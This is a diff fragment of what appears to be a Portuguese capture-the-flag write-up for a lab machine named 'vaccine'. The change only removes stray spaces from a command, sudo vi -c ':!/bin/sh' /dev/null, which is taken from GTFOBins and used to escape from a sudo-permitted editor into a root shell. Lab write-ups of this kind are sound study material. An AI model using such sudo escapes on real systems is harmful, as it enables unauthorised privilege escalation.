@@ -154,7 +154,7 @@ User postgres may run the following commands on vaccine:
 
   Consultando o  [GTO](https://gtfobins.github.io/gtfobins/vi/#sudo) ele nos da essa opção
   
-`  sudo vi -c ':!/bin/sh' /dev/null`
+`sudo vi -c ':!/bin/sh' /dev/null`
    
 ```shell
 postgres@vaccine:~$ sudo vi -c ':!/bin/sh' /dev/null
